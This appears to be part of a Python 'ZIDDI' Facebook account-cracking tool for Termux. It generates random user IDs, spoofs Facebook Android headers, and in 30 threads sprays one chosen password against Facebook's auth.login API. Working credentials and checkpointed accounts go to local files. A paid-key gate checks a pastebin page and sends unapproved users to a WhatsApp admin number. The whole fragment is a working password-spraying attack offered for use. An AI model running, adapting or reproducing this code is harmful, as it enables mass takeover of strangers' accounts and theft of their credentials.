				open("2009-ZIDDI-OK.txt","a").write(" %s | %s\n"%(uid, pw))

				break

			else:

				continue



		self.loop +=1



	def old2(self):

		x = 1111111111

		xx = 9999999999

		idx = "10000" 

		os.system('clear');print(logo)

		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT - 50,000: "))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")

				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))

				os.system("clear")

				print(logo)

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))

				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n [>>] CRACK COMPLETE...")

		except Exception as e:exit(str(e))



	def api(self, uid, pwx):

		rua = random.choice([

			"Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1",
			
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h",

"Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/",

"Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;] FBBK/1",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;] FBBK/1",

"Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",

"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM",

"Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]",

"Dalvik/1.6.0 (Linux; U; Android 13; SM-G3518 Build/JLS36C) [FBAN/Orca-Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/199281912;FBCR/Maxcom;FBMF/samsung;FBBD/samsung;;FBDV/SM-G3518;FBDM/{density=1.0,width=720,=height=1200};FBSV/13.0.1;FBCA/armeabi-v7a:armeabi;]",

"Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;] ",

"Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",

"Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1",

"Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1",

"Mozilla/5.0 (Linux; Android 9; S32 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/285.0.0.17.119;]"

		])

		sys.stdout.write(

			"\r [ZIDDI ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))

		); sys.stdout.flush()

		for pw in pwx:

			pw = pw.lower()

			ses = requests.Session()

			headers = {

				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 

				"x-fb-sim-hni": str(random.randint(20000, 40000)), 

				"x-fb-net-hni": str(random.randint(20000, 40000)), 

				"x-fb-connection-quality": "EXCELLENT",

				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",

				"user-agent": rua, 

				"content-type": "application/x-www-form-urlencoded", 

				"x-fb-http-engine": "Liger"

			}

			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 

			if "session_key" in response.text and "EAAA" in response.text:

				print("\r \033[0;92m[ ZIDDI-OK ] %s | %s\033[0;97m         "%(uid, pw))

				print ("\r \033[0;92m Congrats Bro ")

				self.ok.append("%s|%s"%(uid, pw))

				open("2009-ZIDDI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[0;92m[ ZIDDI-OK ] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("2009-ZIDDI -OK.txt","a").write(" %s | %s\n"%(uid, pw))

				break

			else:

				continue



		self.loop +=1





def Subscraption():

	key1=open('/data/data/com.termux/files/usr/bin/.mrZIDDI-cov', 'r').read()

	clear()

	print(logo)

	r1=requests.get("https://pastebin.com/p3jbWM14").text

	if key1 in r1:

		os.system('clear')

		print(logo)

		Main()

	else:

		os.system("clear")

		print(logo)

		print("\t \033[1;32m First Get Approvel\033[1;37m ")

		time.sleep(1)

		os.system("clear")

		print(logo)

		print ("")

		print(" \033[1;32m ZIDDI Toll Paid You Need Get Approved First\033[1;37m\n")

		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")

		print ("")

		print(" Your Key is Not Approved ")

		print("")

		print(" Copy And Send Key To Admin")

		print ("")

		print (" Your Key : "+Ilove+ZIDDI+key1)

		print ("")

		name = input(" Your Name : ")

		print ("")

		input(" Press Enter To Send Key")

		time.sleep(3.5)

		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ZIDDI+''+key1

		os.system('am start https://wa.me/+8801304002896?text=' + tks)

		Subscraption()        

Main()

